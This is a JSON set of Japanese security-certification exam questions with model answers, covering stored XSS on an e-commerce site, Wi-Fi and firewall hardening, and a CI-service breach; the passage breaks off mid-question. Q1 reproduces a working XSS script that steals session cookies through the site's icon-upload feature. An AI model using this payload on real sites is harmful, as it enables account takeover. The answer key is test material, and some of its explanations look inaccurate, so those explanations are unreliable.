{
  "questions": [
    {
      "qNo": 1,
      "theme": "Web Application Program Development and Security (XSS)",
      "description": "Q社は、洋服のEC事業を手掛ける従業員100名の会社である。WebアプリQというWebアプリケーションプログラムでECサイトを運営している。ECサイトのドメイン名は“□□□.co.jp”であり、利用者はWebアプリQにHTTPSでアクセスする。WebアプリQの開発と運用は、Q社開発部が行っている。今回, WebアプリQに、ECサイトの会員による商品レビュー機能を追加した。図1は、WebアプリQの主な機能である。\n\n## 図1 Web アプリQの主な機能\n\n| No. | 機能名 | 概要 |\n|---|---|---| \n| 1. | 会員登録機能 | ECサイトの会員登録を行う。 |\n| 2. | ログイン機能 | 会員IDとパスワードで会員を認証する。ログインした会員には、セッションIDをcookieとして払い出す。 |\n| 3. | カートへの商品の追加及び削除機能 | (省略) |\n| 4. | 商品の購入機能 | ログイン済み会員だけが利用できる。(省略) |\n| 5. | 商品レビュー機能 | 商品レビューを投稿したり閲覧したりするページを提供する。商品レビューの投稿は、ログイン済み会員だけが利用できる。会員がレビューページに入力できる項目のうち、レビュータイトルとレビュー詳細の欄は自由記述が可能であり、それぞれ50字と300字の入力文字数制限を設けている。 |\n| 6. | 会員プロフィール機能 | アイコン画像をアップロードして設定するためのページ(以下,会員プロフィール設定ページという)や、クレジットカード情報を登録するページを提供する。どちらのページもログイン済み会員だけが利用できる。アイコン画像のアップロードは、次をパラメータとして、\"https://□□□.co.jp/user/upload”に対して行う。\n\n・画像ファイル (uploadfile)\n・\"https://□□□.co.jp/user/profile\" にアクセスして払い出されたトークン (token)\n\nパラメータのトークンが, “https://□□□.co.jp/user/profile” にアクセスして払い出されたものと一致したときは、アップロードが成功する。アップロードしたアイコン画像は、会員プロフィール設定ページや、レビューページに表示される。(省略)|\n\nある日、会員から、無地Tシャツのレビューページ(以下,ページVという)に16件表示されるはずのレビューが2件しか表示されていないという問合せが寄せられた。開発部のリーダーであるNさんがページVを閲覧してみると、画面遷移上おかしな点はなく、図2が表示された。\n\n## 図2 ページ V (画面構成)\n\n商品レビュー (無地Tシャツ)が表示されている。レビュー投稿ボタンあり。評価: ★4.9 (16件のレビュー)。会員Aと会員Bの2件が表示され、「以上,全16件のレビュー」と続く。\n\nWebアプリQのレビューページでは、次の項目がレビューの件数分表示されるはずである。（中略）\n\n不審に思ったNさんはページVのHTMLを確認した。図3は、ページVのHTMLである。\n\n## 図3 ページ VのHTML (抜粋)\n\n```html\n(省略)\n<div class=\"review-number\">16件のレビュー</div>\n<div class=\"review\">\n<div class=\"icon\"><img src=\"/users/dac6c8f12f867ed5/icon.png\"></div>\n<div class=\"displayname\">会員 A</div>\n<div class=\"date\">2023年4月10日</div><div class=\"star\">★★★★★</div>\n<div\nclass=\"review-title\">Good<script>xhr=new XMLHttpRequest();/*</div>\n<div class=\"description\">a</div>\n</div>\n<div class=\"review\">\n<div class=\"icon\"><img src=\"/users/dac6c8f12f867ed5/icon.png\"></div>\n<div class=\"displayname\">会員 A</div>\n<div class=\"date\">2023年4月10日</div><div class=\"star\">★★★★★</div>\n<div class=\"review-title\">*/url1=\"https://☐☐☐.co.jp/user/profile\"; /*</div>\n<div class=\"description\">a</div>\n</div>\n(省略)\n<div class=\"review\">\n<div class=\"icon\"><img src=\"/users/dac6c8f12f867ed5/icon.png\"></div>\n<div class=\"displayname\">会員 A</div>\n<div class=\"date\">2023年4月10日</div><div class=\"star\">★★★★★</div>\n<div\nclass=\"review-title\">*/xhr2.send(form);} </script></div>\n<div class=\"description\">Nice shirt!</div>\n</div>\n<div class=\"review\">\n<div class=\"icon\"><img src=\"/users/94774f6887f73b91/icon.png\"></div>\n<div class=\"displayname\">会員 B</div>\n<div class=\"date\">2023年4月1日</div><div class=\"star\">★★★★</div>\n<div class=\"review-title\">形も素材も良いく/div>\n<div class=\"description\">サイズ感がぴったりフィットして気に入っています(&gt;_&lt;)<br>\n手触りも良く、値段を考えると良い商品です。</div>\n</div>\n<div class=\"review-end\">以上,全16件のレビュー</div>\n(省略)\n```\n\n図3のHTMLを確認したNさんは、会員Aによって15件のレビューが投稿されていること、及びページVには長いスクリプトが埋め込まれていることに気付いた。Nさんは、ページVにアクセスしたときに生じる影響を調査するために、アクセスしたときにWebブラウザで実行されるスクリプトを抽出した。図4は、Nさんが抽出したスクリプトである。\n\n## 図4 Nさんが抽出したスクリプト\n\n```javascript\n1: xhr = new XMLHttpRequest();\n2: url1 = \"https://□□□.co.jp/user/profile\";\n3: xhr.open(\"get\", url1);\n4: xhr.responseType = \"document\"; // レスポンスをテキストではなくDOMとして受信する。\n5: xhr.send();\n6: xhr.onload = function() {\n// 以降は、1回目のXMLHttpRequest (XHR)のレスポンス\n// の受信に成功してから実行される。\n7: page = xhr.response;\n8: token = page.getElementById(\"token\").value;\n9: xhr2 = new XMLHttpRequest();\n10: url2 = \"https://□□□.co.jp/user/upload\";\n11: xhr2.open(\"post\", url2);\n12: form = new FormData();\n13: cookie = document.cookie;\n14: fname = \"a.png\";\n15: ftype = \"image/png\";\n16: file = new File([cookie], fname, {type: ftype});\n// アップロードするファイルオブジェクト\n// 第1引数: ファイルコンテンツ\n// 第2引数: ファイル名\n// 第3引数: MIMEタイプなどのオプション\n17: form.append(\"uploadfile\", file);\n18: form.append(\"token\", token);\n19: xhr2.send(form);\n20: }\n```\n\nNさんは、会員Aの投稿はクロスサイトスクリプティング (XSS) 脆弱性を悪用した攻撃を成立させるためのものであるという疑いをもった。NさんがWebアプリQを調べたところ、WebアプリQには、会員が入力したスクリプトが実行されてしまう脆弱性があることを確認した。加えて、WebアプリQがcookieにHttpOnly属性を付与していないこと及びアップロードされた画像ファイルの形式をチェックしていないことも確認した。\nQ社は、必要な対策を施し、会員への必要な対応も行った。",
      "questions": [
        {
          "subQNo": "設問1",
          "text": "この攻撃で使われた XSS 脆弱性について答えよ。",
          "subQuestions": [
            {
              "label": "(1)",
              "text": "XSS 脆弱性の種類を解答群の中から選び、記号で答えよ。\n解答群: ア DOM Based XSS, イ 格納型 XSS, ウ 反射型 XSS"
            },
            {
              "label": "(2)",
              "text": "Web アプリQにおける対策を、30字以内で答えよ。"
            }
          ],
          "explanation": "### 設問1 (1) 解説\n攻撃者が入力したレビュータイトル欄の内容がデータベースに保存され、他のユーザーがレビューページを閲覧した際にその内容（スクリプト）が実行されています。これは、攻撃コードがアプリケーションのデータストアに永続的に格納される格納型XSSです。\n\n**解答**: イ\n\n### 設問1 (2) 解説\n脆弱性は、ユーザー入力をそのままHTMLとして表示してしまったことです。対策として、レビュータイトルや詳細を出力する際に、HTMLタグや特殊文字を無害なエンティティに変換するエスケープ処理を施す必要があります。\n\n**解答例**: レビュー投稿内容を出力する際に適切にエスケープ処理を行う。"
        },
        {
          "subQNo": "設問2",
          "text": "図3について、入力文字数制限を超える長さのスクリプトが実行されるようにした方法を、50字以内で答えよ。",
          "explanation": "### 設問2 解説\n図3のHTMLでは、スクリプトが複数のレビュータイトル (`review-title` div) に分散して埋め込まれています。各タイトルは50字制限ですが、HTMLコメントアウト記号 (`/*`, `*/`) やタグを組み合わせることで、分割されたスクリプト全体が実行されるようにしています。\n\n**解答例**: スクリプトを文字数制限内に収まるように分割し、HTMLのコメントアウトやタグを組み合わせて複数のレビュータイトル欄に挿入した。"
        },
        {
          "subQNo": "設問3",
          "text": "図4のスクリプトについて答えよ。",
          "subQuestions": [
            {
              "label": "(1)",
              "text": "図4の6~20行目の処理の内容を,60字以内で答えよ。"
            },
            {
              "label": "(2)",
              "text": "攻撃者は、図4のスクリプトによってアップロードされた情報をどのようにして取得できるか。取得する方法を、50字以内で答えよ。"
            },
            {
              "label": "(3)",
              "text": "攻撃者が(2)で取得した情報を使うことによってできることを、40字以内で答えよ。"
            }
          ],
          "explanation": "### 設問3 (1) 解説\n6行目以降は、まずXHRでユーザープロフィールページにアクセスし、レスポンスから認証トークンを取得しています（行7-8）。次に、そのトークンとセッションCookieをファイル内容としたPNGファイルを作成し、アイコン画像アップロードエンドポイントへ送信しています（行10-19）。\n\n**解答例**: 認証トークンを取得し、セッションCookieをファイル内容とする画像をアップロードエンドポイントへ送信している。\n\n### 設問3 (2) 解説\nアップロードされた画像ファイルにはCookie情報がバイナリとして含まれています。攻撃者は、自分がアップロードした画像が表示される際のURL（例えば、レビューページに表示されるアイコン画像のURL）を確認し、そのURLから画像ファイルとしてダウンロードすることで、ファイル内容、すなわちCookie情報を取得できます。\n\n**解答例**: 攻撃者が自身のレビューページを閲覧し、アップロードされたアイコン画像のURLを確認し、そのURLからファイルをダウンロードする。\n\n### 設問3 (3) 解説\n取得したセッションCookieは、被害者がWebアプリQにログイン済みであることを示す認証情報です。攻撃者はこのCookieを使用することで、被害者になりすましてECサイトにアクセスし、不正な操作を行うことができます。\n\n**解答例**: 盗み出したセッションCookieを利用して、被害者会員になりすましてECサイトにログインする。"
        },
        {
          "subQNo": "設問4",
          "text": "仮に、攻撃者が用意したドメインのサイトに図4と同じスクリプトを含むHTMLを準備し、そのサイトにWebアプリQのログイン済み会員がアクセスしたとしても, Web ブラウザの仕組みによって攻撃は成功しない。この仕組みを、40字以内で答えよ。",
          "explanation": "### 設問4 解説\n図4のスクリプトは、WebアプリQのオリジン（`□□□.co.jp`）に対してXHRリクエストを送信しています。もしこのスクリプトが異なるオリジン（攻撃者サイト）で実行された場合、ブラウザのセキュリティ機能である同一オリジンポリシー（SOP）により、異なるオリジンへのHTTPリクエストが制限されるため、攻撃は成功しません。\n\n**解答例**: スクリプトが異なるオリジンへのリクエストを禁止する同一オリジンポリシー。"
        }
      ],
      "point": 25,
      "subCategory": "その他"
    },
    {
      "qNo": 2,
      "theme": "Security Measures Review and Network Configuration",
      "description": "M社は、L社の子会社であり、アパレル業を手掛ける従業員100名の会社である。（中略）\n\n## 図1 M社のネットワーク構成\n\n```mermaid\ngraph TD\n    B[Bサービス] --> I[インターネット]\n    I --> FW[FW]\n    FW -- WAN-IF1 --> I\n    \n    subgraph 執務室\n        DHCPS[DHCPサーバ]\n        DNSS[DNSサーバ]\n        DirS[ディレクトリサーバ]\n        TS[業務サーバ]\n        AP1[AP-1: 従業員用]\n        \n        TS & DHCPS & DNSS & DirS --> L2SW\n        AP1 --> L2SW\n        EPC_O(業務PC) -- Wifi --> AP1\n    end\n    \n    subgraph 会議室\n        AP5[AP-5: 従業員用/来客用]\n        T(来客持込端末)\n        EPC_C(業務PC)\n        PJT(プロジェクター)\n        \n        AP5 --> L2SW\n        T & EPC_C -- Wifi --> AP5\n    end\n    \n    FW -- IF1 --> L2SW[L2SW]\n    \n    style DHCPS fill:#f9f,stroke:#333\n    style DNSS fill:#f9f,stroke:#333\n```\n\n## 表1 構成要素の概要(抜粋)\n\n| 構成要素 | 概要 |\n|---|---|\n| FW | ・通信制御はステートフルパケットインスペクション型である。\n・NAT機能を有効にしている。\n・DHCPリレー機能を有効にしている。 |\n| AP-1~5 | ・無線LANの認証方式はWPA2-PSKである。\n・AP-5には、従業員用無線LANのSSIDと来客用無線LANのSSIDの両方が設定されている。\n・従業員用無線LANだけにMACアドレスフィルタリングが設定されており、事前に情報システム部で登録された業務PCだけが接続できる。 |\n| Bサービス | ・HTTPSでアクセスする。\n・HTTP Strict Transport Security (HSTS) を有効にしている。\n・M社の従業員に割り当てられた利用者ID([a1.b1.c1.d1])からだけ、Bサービスにログイン可能である。\n・ファイル共有機能があり。外部共有リンクは、発行されるたびに新たに生成される推測困難なランダム文字列を含み、有効期限は1日に設定されている。 |\n| DHCP サーバ | ・業務PC, 来客持込端末にIPアドレスを割り当てる。 |\n| DNS サーバ | ・業務PC, 来客持込端末が利用するDNSキャッシュサーバである。 |\n\n## 表2 M社のセキュリティルール(抜粋)\n\n| 項目 | セキュリティルール |\n|---|---|\n| 業務用のファイルの持出し | ・Bサービスのファイル共有機能以外の方法での社外への持出しを禁止する。 |\n\n## 表3 FWのVLAN インタフェース設定\n\n| 項番 | 物理インタフェース名 | タグ VLAN | VLAN 名 | VLAN ID | IP アドレス | サブネットマスク |\n|---|---|---|---|---|---|---|\n| 1 | IF1 | 有効 | VLAN10 | 10 | 192.168.10.1 | 255.255.255.0 |\n| 2 | IF1 | 有効 | VLAN20 | 20 | 192.168.20.1 | 255.255.255.0 |\n| 3 | IF1 | 有効 | VLAN30 | 30 | 192.168.30.1 | 255.255.255.0 |\n| 4 | WAN-IF1 | 無効 | VLAN1 | 1 | a1.b1.c1.d1 | 255.255.255.248 |\n\n## 表4 FWのフィルタリング設定\n\n| 項番 | 入力インタフェース | 出力インタフェース | 送信元 IP アドレス | 宛先 IP アドレス | サービス | 動作 | NAT |\n|---|---|---|---|---|---|---|---|\n| 1 | IF1 | WAN-IF1 | 192.168.10.0/24 | 全て | HTTP, HTTPS | 許可 | 有効 |\n| 4 | IF1 | IF1 | 192.168.10.0/24 | 192.168.30.0/24 | DNS | 許可 | 無効 |\n\n## 表5 AP-5の設定(抜粋)\n\n| 項目 | 設定1 (m-guest) | 設定2 (m-employee) |\n|---|---|---| \n| 認証方式 | WPA2-PSK | WPA2-PSK |\n| VLAN ID | 10 | 20 |\n\n[社外の攻撃者によるファイルの持出しについてのセキュリティ対策の確認]\nS氏: それは考えられます。しかし、Bサービスにログインするには [ a ] と [ b ] が必要です。\n（中略）\nS氏: 従業員がHTTPSで偽サイトにアクセスしようとすると、安全な接続ではないという旨のエラーメッセージとともに、偽サイトに使用されたサーバ証明書に応じて、図2に示すエラーメッセージの詳細の一つ以上がWebブラウザに表示されます。（中略）\n\n## 図2 エラーメッセージの詳細(抜粋)\n\n- [ c ]\n- [ d ]\n- このサーバ証明書は、失効している。\n- このサーバ証明書は、有効期限が切れている。\n\nS氏: 大丈夫です。HSTSを有効にしてあるので、その場合でも、下線①先ほどと同じエラーメッセージが表示されます。\n\n[従業員によるファイルの持出しについてのセキュリティ対策の確認]\nS氏: そうすると、従業員は、下線②ファイル共有機能を悪用すれば、M社外からBサービスにあるファイルをダウンロード可能ですね。\n（中略）\n方法1:個人所有PCの無線LANインタフェースの [ e ] を業務PCの無線LANインタフェースの [ e ] に変更した上で、個人所有PCを従業員用無線LANに接続し、Bサービスからファイルをダウンロードし、個人所有PCごと持ち出す。\n\n[方法1と方法2についての対策の検討]\n方法1への対策については、従業員用無線LANの認証方式としてEAP-TLSを選択し、下線③認証サーバを用意することにした。\nS氏: クライアント証明書とそれに対応する [ f ] は、どのようにしますか。\nYさん: クライアント証明書は、CAサーバを新設して発行することにし、従業員が自身の業務PCにインストールするのではなく、ディレクトリサーバの機能で業務PCに格納します。 [ f ] は [ g ] しておくために業務PCのTPMに格納し、保護します。\nS氏: 下線④その格納方法であれば問題ないと思います。\n\n方法2への対策については、次の二つの案を検討した。\n・下線⑤FWのNATの設定を変更する。\n・無線LANサービスであるDサービスを利用する。（中略）\n\n今まで必要だった、来客持込端末からDHCPサーバと [ h ] サーバへの通信は、不要になる。さらに、表5について不要になった設定を削除するとともに、下線⑥表3及び表4についても、不要になった設定を全て削除する。また、プロジェクターについては、来客用無線LANを利用せず、HDMIケーブルで接続する方法に変更する。",
      "questions": [
        {
          "subQNo": "設問1",
          "text": "[社外の攻撃者によるファイルの持出しについてのセキュリティ対策の確認]について答えよ。",
          "subQuestions": [
            {
              "label": "(1)",
              "text": "本文中の [ a ], [ b ] に入れる適切な字句を答えよ。"
            },
            {
              "label": "(2)",
              "text": "図2中の [ c ], [ d ] に入れる適切な字句を、それぞれ40字以内で答えよ。"
            },
            {
              "label": "(3)",
              "text": "本文中の下線①について,エラーメッセージが表示される直前までの Web ブラウザの動きを、60字以内で答えよ。"
            }
          ],
          "explanation": "### 設問1 (1) 解説\nBサービスへのログインに必要な認証情報です。Bサービスは利用者IDとパスワードでログインします。\n\n**解答**: a: 利用者ID, b: パスワード\n\n### 設問1 (2) 解説\n攻撃者が用意した偽サイトの証明書は、正規のBサービスドメイン名と一致しないか、あるいは信頼されていないCAによって発行されている可能性が高いです。\n\n**解答例**: c: このサーバ証明書は、サイトのドメイン名と一致しません。, d: このサーバ証明書は、信頼されていない認証局によって発行されています。\n\n### 設問1 (3) 解説\nBサービスがHSTSを有効にしているため、ユーザーが誤って`http://`でアクセスを試みた場合でも、Webブラウザは自動的に`https://`に書き換えて接続を試みます。\n\n**解答例**: ブラウザがHSTSの設定に従い、URLのスキームをhttpからhttpsに自動的に書き換える。"
        },
        {
          "subQNo": "設問2",
          "text": "[従業員によるファイルの持出しについてのセキュリティ対策の確認]について答えよ。",
          "subQuestions": [
            {
              "label": "(1)",
              "text": "本文中の下線②について, M社外からファイルをダウンロード可能にするためのファイル共有機能の悪用方法を、40字以内で具体的に答えよ。"
            },
            {
              "label": "(2)",
              "text": "本文中の [ e ] に入れる適切な字句を答えよ。"
            }
          ],
          "explanation": "### 設問2 (1) 解説\nBサービスのファイル共有機能は、上長承認を得て外部共有リンクを発行することで、M社外の者がログインなしでファイルをダウンロードできるようにするものです。悪用は、この外部共有リンクを不正に発行し、外部の第三者に送ることです。\n\n**解答例**: 業務ファイルを外部共有リンクとして発行し、M社外の第三者に送信する。\n\n### 設問2 (2) 解説\n方法1では、個人PCを従業員用無線LANの接続が許可されている業務PCになりすます必要があります。従業員用無線LANはMACアドレスフィルタリングを利用しているため、個人PCのMACアドレスを変更する必要があります。\n\n**解答**: MACアドレス"
        },
        {
          "subQNo": "設問3",
          "text": "[方法1と方法2についての対策の検討]について答えよ。",
          "subQuestions": [
            {
              "label": "(1)",
              "text": "本文中の下線③について、認証サーバが EAP で使う UDP 上のプロトコルを答えよ。"
            },
            {
              "label": "(2)",
              "text": "本文中の [ f ] に入れる適切な字句を答えよ。"
            },
            {
              "label": "(3)",
              "text": "本文中の [ g ] に入れる適切な字句を,20字以内で答えよ。"
            },
            {
              "label": "(4)",
              "text": "本文中の下線④について、その理由を、40字以内で答えよ。"
            },
            {
              "label": "(5)",
              "text": "本文中の下線⑤について,変更内容を,70字以内で答えよ。"
            },
            {
              "label": "(6)",
              "text": "本文中の [ h ] に入れる適切な字句を答えよ。"
            },
            {
              "label": "(7)",
              "text": "本文中の下線⑥について、表3及び表4の削除すべき項番を、それぞれ全て答えよ。"
            }
          ],
          "explanation": "### 設問3 (1) 解説\nEAPを無線LANの認証（802.1X）で用いる際、認証サーバ（RADIUSサーバ）との間で認証情報をUDP上でやり取りするために使用されるプロトコルはRADIUSです。\n\n**解答**: RADIUS\n\n### 設問3 (2) 解説\nクライアント証明書による認証には、クライアント証明書（公開鍵）と、それに対応する秘密鍵が必要です。\n\n**解答**: 秘密鍵\n\n### 設問3 (3) 解説\n秘密鍵をTPMに格納し保護する目的は、OSやソフトウェアから秘密鍵が不正に読み出されるのを防ぎ、鍵の機密性を確保することです。\n\n**解答**: 秘密鍵の機密性を確保\n\n### 設問3 (4) 解説\nTPMはハードウェアで鍵を保護するため、秘密鍵がマルウェアなどによるソフトウェア的な攻撃や物理的な盗難から守られ、不正利用されることを防止できます。\n\n**解答**: 秘密鍵を盗難やマルウェアによる不正利用から保護できるため。\n\n### 設問3 (5) 解説\n方法2は、来客用無線LAN (192.168.10.0/24) 経由でBサービスにアクセスするリスクです。現在、来客用LANからの通信はFWでNATが有効になっているため、Bサービスへのアクセスが成功してしまいます。これを防ぐには、来客用LANからの通信のNATを無効にする必要があります。\n\n**解答例**: FWのフィルタリング設定において、送信元IPアドレス192.168.10.0/24のインターネット向け通信に対するNATを無効にする。\n\n### 設問3 (6) 解説\n来客持込端末はDルータを経由するようになったため、M社内のDHCPサーバとDNSサーバを利用しなくなります。\n\n**解答**: DNS\n\n### 設問3 (7) 解説\n来客用無線LAN (VLAN 10) が廃止されたため、VLAN 10に関する設定を削除します。\n表3 (VLAN設定): 項番1 (VLAN10設定)\n表4 (フィルタリング設定): 項番1 (VLAN10からの外部通信), 項番4 (VLAN10からVLAN30へのDNS通信)\n\n**解答**: 表3: 1, 表4: 1, 4"
        }
      ],
      "point": 25,
      "subCategory": "その他"
    },
    {
      "qNo": 3,
      "theme": "Continuous Integration (CI) Service Security Incident Response",
      "description": "N社は、Nサービスという継続的インテグレーションサービスを提供している従業員400名の事業者である。（中略）\n\n## 表1 Nサービスの機能の概要(抜粋)\n\n| 機能名 | 概要 |\n|---|---|\n| ソースコード取得機能 | （中略）VCSホスト名、リポジトリ固有の認証用SSH鍵を登録する。コミット通知をHTTPSで受け取り開始。 |\n| コマンド実行機能 | 取得後、ルートディレクトリのci.sh(ビルドスクリプト)を実行。 |\n| シークレット機能 | ビルドスクリプト実行シェルに設定される環境変数を登録。登録情報はシークレットと呼ばれる。APIキーなどを直接記載しないようにする。 |\n\nNサービスはC社のクラウド基盤で稼働している。\n\n## 表2 Nサービスの構成要素の概要(抜粋)\n\n| 構成要素 | 概要 |\n|---|---|\n| フロントエンド | VCSからのコミット通知APIを備えたWebサイト。 |\n| ユーザーデータベース | 利用者が登録したVCSホスト名、認証用SSH鍵、及びシークレットを保存。 |\n| バックエンド | Linuxインストール済。CIデーモンが稼働(ソースコード取得/コマンド実行)。インターネット通信可能。50台ある。 |\n\nフロントエンドは、ソースコードのコミットの通知を受け取ると図1の処理を行う。\n\n## 図1 フロントエンドが行う処理\n\n```mermaid\nsequenceDiagram\n    participant VCS\n    participant FE as フロントエンド\n    participant UDB as ユーザーデータベース\n    participant BE as バックエンド(CI デーモン)\n\n    VCS ->> FE: コミット通知\n    FE ->> UDB: 1. 情報取得(VCSホスト名, SSH鍵, シークレット)\n    UDB -->> FE: 情報\n    FE ->> FE: 2. バックエンドを選択\n    FE ->> BE: 3. 情報送信と処理命令\n    BE -->> FE: 応答\n```\n\nCIデーモンは、処理命令を受け取ると、特権を付与せずに新しいコンテナを起動し、当該コンテナ内でソースコード取得機能とコマンド実行機能を順に実行する。\nビルドスクリプトには、利用者が任意のコマンドを記述できるので、不正なコマンドを記述されてしまうおそれがある。さらに、不正なコマンドの処理の中には、下線①コンテナによる仮想化の脆弱性を悪用しなくても成功してしまうものがある。そこで、バックエンドには管理者権限で稼働する監視ソフトウェア製品Xを導入している。（中略）\n\n[N社のインシデントの発生と対応]\n（中略）\nHさんは、同日10時の国外IPアドレスからのログインは下線②攻撃者による不正ログインだったと判断した。\n（中略）\nそこで、下線③RFC 9162 に規定された証明書発行ログ中のNサービスのドメインのサーバ証明書を検索したところ、正規のもののほかに、N社では利用実績のない認証局Rが発行したものを発見した。\n（中略）\nプロセスYは、下線④監視ソフトウェアに検知されないようにSNIを偽装していたと考えられた。（中略）Hさんは、下線⑤プロセスYがシークレットを取得したおそれがあると考えた。\n（中略）\n\nHさんは図2に示す事後処理と対策を行うことにした。\n\n## 図2 事後処理と対策(抜粋)\n\n1. フロントエンド及び全てのバックエンドを再構築する。\n2. 認証局Rに対し、Nサービスのドメインのサーバ証明書が勝手に発行されていることを伝え、その失効を申請する。\n3. 偽サイトでログインを試みてしまっても、クラウド管理サイトに不正ログインされることのないよう、クラウド管理サイトにログインする際の認証を下線⑥WebAuthn (Web Authentication)を用いた認証に切り替える。\n4. Nサービスのドメインのサーバ証明書を発行できる認証局を限定するために、Nサービスのドメインの権威DNSサーバに、Nサービスのドメイン名に対応する [ a ] レコードを設定する。\n\n[N社の顧客での対応]\n\nP社は、Nサービスのソースコード取得機能に、Pアプリのソースコードを保存しているVCSのホスト名とリポジトリの認証用SSH鍵を登録している。Nサービスのシークレット機能には、表3に示す情報を登録している。\n\n## 表3 P社がNサービスのシークレット機能に登録している情報\n\n| シークレット名 | 値の説明 |\n|---|---|\n| APP_SIGN_KEY | コード署名の付与に利用する署名鍵とコードサイニング証明書 |\n| STORE_API_KEY | Jストアにアプリをアップロードするための認証用APIキー |\n\nPアプリのビルドスクリプトには、図3に示すコマンドが記述されている。\n\n## 図3 ビルドスクリプトに記述されているコマンド\n\n1. コンパイラのコマンド\n2. 生成されたバイナリコードに APP_SIGN_KEY を用いてコード署名を付与するコマンド\n3. STORE_API_KEY を用いて、署名済みのバイナリコードをJストアにアップロードするコマンド\n\n1月4日,P社運用部のKさんがN社からの通知を受信した。（中略）ソースコード及びシークレットが漏えいしたおそれがあるとのことだった。Kさんは、下線⑦Pアプリ利用者に被害が及ぶ攻撃が行われることを予想し、すぐに二つの対応を開始した。\nKさんは、一つ目の対応として、下線⑧漏えいしたおそれがあるので,STORE_API_KEYとして登録されていた認証用APIキーに必要な対応を行った。また、二つ目の対応として、APP_SIGN_KEYとして登録されていたコードサイニング証明書について認証局に失効を申請するとともに、新たな鍵ペアを生成し,コードサイニング証明書の発行申請及び受領を行った。鍵ペア生成時, Nサービスが一時停止しており、鍵ペアの保存に代替手段が必要になった。FIPS 140-2 Security Level 3の認証を受けたハードウェアセキュリティモジュール (HSM)は、下線⑨コード署名を付与する際にセキュリティ上の利点があるので、それを利用することにした。（中略）\nその後、（中略）新規の認証用APIキーを取得し、署名済みのバイナリコードをJストアにアップロードするとともに、下線⑩Kさんの二つの対応によってPアプリ利用者に生じているかもしれない影響,及びそれを解消するためにPアプリ利用者がとるべき対応について告知した。（中略）",
      "questions": [
        {
          "subQNo": "設問1",
          "text": "本文中の下線①について、該当するものはどれか。解答群の中から全て選び、記号で答えよ。\n解答群: ア CIデーモンのプロセスを中断させる。 / イ いずれかのバックエンド上の全プロセスを列挙して攻撃者に送信する。 / ウ インターネット上のWebサーバに不正アクセスを試みる。 / エ 攻撃者サイトから命令を取得し、得られた命令を実行する。 / オ ほかのNサービス利用者のビルドスクリプトの出力を取得する。",
          "explanation": "### 設問1 解説\nコンテナ内での不正コマンド実行により、仮想化脆弱性を悪用せずとも成功する処理は、外部ネットワークへの通信を伴う情報窃取や外部からの制御です。\nウ: 攻撃者が用意したインターネット上のWebサーバにシークレット情報を送信したり、不正な通信ログを残したりする行為。\nエ: 外部サイトから追加の命令やマルウェアを取得・実行する行為。\n\n**解答**: ウ, エ"
        },
        {
          "subQNo": "設問2",
          "text": "[N社のインシデントの発生と対応]について答えよ。",
          "subQuestions": [
            {
              "label": "(1)",
              "text": "本文中の下線②について、攻撃者による不正ログインの方法を,50字以内で具体的に答えよ。"
            },
            {
              "label": "(2)",
              "text": "本文中の下線③について, RFC 9162 で規定されている技術を、解答群の中から選び、記号で答えよ。\n解答群: ア Certificate Transparency, イ HTTP Public Key Pinning, ウ HTTP Strict Transport Security, エ Registration Authority"
            },
            {
              "label": "(3)",
              "text": "本文中の下線④について、このような手法の名称を、解答群の中から選び、記号で答えよ。\n解答群: ア DNS スプーフィング, イ ドメインフロンティング, ウ ドメイン名ハイジャック, エ ランダムサブドメイン攻撃"
            },
            {
              "label": "(4)",
              "text": "本文中の下線⑤について,プロセスYがシークレットを取得するのに使った方法として考えられるものを、35字以内で答えよ。"
            },
            {
              "label": "(5)",
              "text": "図2中の下線⑥について、仮に、利用者が偽サイトでログインを試みてしまっても、攻撃者は不正ログインできない。不正ログインを防ぐ WebAuthn の仕組みを,40字以内で答えよ。"
            },
            {
              "label": "(6)",
              "text": "図2中の [ a ] に入れる適切な字句を、解答群の中から選び、記号で答えよ。\n解答群: ア CAA, イ CNAME, ウ DNSKEY, エ NS, オ SOA, カ TXT"
            }
          ],
          "explanation": "### 設問2 (1) 解説\nUさんはフィッシングメールに記載された偽サイトに誘導され、ID、パスワード、およびTOTPを入力して認証情報を窃取されました。その窃取情報を使って攻撃者が不正ログインを試みました。\n\n**解答例**: フィッシングメールで偽サイトに誘導し、ID、パスワード、TOTPを盗み出してログインを試みた。\n\n### 設問2 (2) 解説\nRFC 9162で規定され、不正な証明書発行を監視するために利用されるログ技術はCertificate Transparency (CT) です。\n\n**解答**: ア\n\n### 設問2 (3) 解説\nプロセスYが、SNIで安全なドメイン名を偽装しつつ、HTTP Hostヘッダーで実際の要注意ドメイン名を指定し、監視を回避しようとしていました。これはDomain Frontingの変種であり、監視回避を目的とした手法です。\n\n**解答**: イ\n\n### 設問2 (4) 解説\nシークレットは、CIデーモンがコンテナ内でビルドスクリプトを実行する際に環境変数として設定されます。プロセスYは管理者権限で稼働しているため、このコンテナの実行環境にアクセスし、設定されている環境変数からシークレット（APIキーや署名鍵）を読み取ることが可能です。\n\n**解答例**: コンテナ内のシェル環境変数からシークレットを読み取った。\n\n### 設問2 (5) 解説\nWebAuthnは、認証情報（秘密鍵）を特定のオリジン（ドメイン）と厳密に紐付けます。偽サイトのオリジンでは、認証器が正しい秘密鍵を使用することを拒否するため、認証が成功しません。\n\n**解答例**: 秘密鍵が特定のドメインと紐付けられており、偽サイトで認証できないため。\n\n### 設問2 (6) 解説\nドメインの権威DNSサーバに設定し、そのドメインの証明書を発行できる認証局を制限するために使用するレコードはCAA (Certification Authority Authorization) レコードです。\n\n**解答**: ア\n"
        },
        {
          "subQNo": "設問3",
          "text": "[N社の顧客での対応]について答えよ。",
          "subQuestions": [
            {
              "label": "(1)",
              "text": "本文中の下線⑦について、Kさんが開始した対応を踏まえ、予想される攻撃を,40字以内で答えよ。"
            },
            {
              "label": "(2)",
              "text": "本文中の下線⑧について、必要な対応を、20字以内で答えよ。"
            },
            {
              "label": "(3)",
              "text": "本文中の下線⑨について、コード署名を付与する際にHSMを使うことによって得られるセキュリティ上の利点を、20字以内で答えよ。"
            },
            {
              "label": "(4)",
              "text": "本文中の下線⑩について、影響と対応を、それぞれ20字以内で答えよ。"
            }
          ],
